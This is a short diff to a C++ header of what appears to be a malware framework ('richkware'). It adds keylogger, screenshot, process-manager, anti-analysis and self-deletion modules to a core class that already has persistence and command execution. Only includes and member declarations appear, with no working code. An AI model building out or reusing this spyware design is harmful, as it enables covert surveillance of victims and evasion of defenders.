@@ -6,6 +6,11 @@
 #include "../system/persistence.hpp"
 #include "../modules/command_executor.hpp"
 #include "../modules/file_manager.hpp"
+#include "../modules/keylogger.hpp"
+#include "../modules/screenshot.hpp"
+#include "../modules/process_manager.hpp"
+#include "../modules/anti_analysis.hpp"
+#include "../modules/self_deletion.hpp"
 
 #include <memory>
 #include <atomic>
@@ -94,6 +99,11 @@ private:
     std::unique_ptr<system::PersistenceManager> persistence_manager_;
     std::unique_ptr<modules::CommandExecutor> command_executor_;
     std::unique_ptr<modules::FileManager> file_manager_;
+    std::unique_ptr<modules::Keylogger> keylogger_;
+    std::unique_ptr<modules::Screenshot> screenshot_;
+    std::unique_ptr<modules::ProcessManager> process_manager_;
+    std::unique_ptr<modules::AntiAnalysis> anti_analysis_;
+    std::unique_ptr<modules::SelfDeletion> self_deletion_;
 };
 
 } // namespace richkware::core
